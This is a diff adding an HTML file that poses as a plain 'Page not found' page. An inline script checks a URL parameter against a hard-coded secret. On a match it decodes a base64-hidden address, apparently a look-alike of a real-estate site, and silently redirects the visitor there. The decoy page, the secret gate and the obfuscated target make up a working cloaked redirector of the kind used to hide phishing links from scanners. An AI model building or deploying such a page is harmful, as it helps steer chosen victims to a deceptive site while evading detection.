@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Page not found</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background: #0f0f0f; color: #888; margin: 2rem; text-align: center; }
+    .decoy { margin-top: 3rem; }
+  </style>
+</head>
+<body>
+  <div class="decoy" id="decoy">Page not found.</div>
+
+  <script>
+    (function () {
+      var SECRET = "l8ESu77ZzXsRzSnootPixqJusBN1";
+      var PARAM = "k";
+      var ENCODED_TARGET = "aHR0cHM6Ly9wcm8tZm90b2Nhc2Euc3U5OTgyLmNjLw==";
+
+      function decodeBase64(str) {
+        try { return atob(str); } catch (_) { return ""; }
+      }
+
+      var params = new URLSearchParams(window.location.search);
+      var value = params.get(PARAM);
+
+      if (value && value === SECRET) {
+        var target = decodeBase64(ENCODED_TARGET);
+        if (target) {
+          window.location.replace(target);
+        }
+      }
+    })();
+  </script>
+</body>
+</html>
+
